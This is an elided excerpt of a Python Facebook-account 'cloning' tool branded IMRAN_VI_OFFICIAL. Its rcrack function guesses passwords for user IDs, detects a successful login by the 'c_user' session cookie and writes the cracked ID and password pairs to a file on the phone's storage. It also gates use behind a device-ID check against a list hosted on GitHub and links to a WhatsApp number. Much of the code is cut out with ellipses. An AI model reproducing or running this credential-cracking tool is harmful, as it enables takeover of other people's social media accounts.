...
from os import system as _IMRAN _
try:
    import requests
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','IMRAN is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
def IMRAN():
    ...
    _IMRAN_("clear")
    print(logo)
    _IMRAN_("espeak \"Hi sir ,Wellcome to EHC EMRAN IMRAN_VI_OFFICIAL  Rendom cloneing tool\"")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                _IMRAN_("espeak \"congratulations you got a ok id\"")
                open('/sdcard/IMRAN_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                _IMRAN_("espeak \"IMRAN_VI is brand\"")
                #open('/sdcard/IMRAN_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/IMRAN-VI-OFFICIAL/ima/main/ima").text
    if id in DARK:
        os.system('clear')
        print(logo)
        IMRAN()
        ...
        os.system('am start https://wa.me/+8801324525088?text=' + tks)
        superuser()        
superuser()
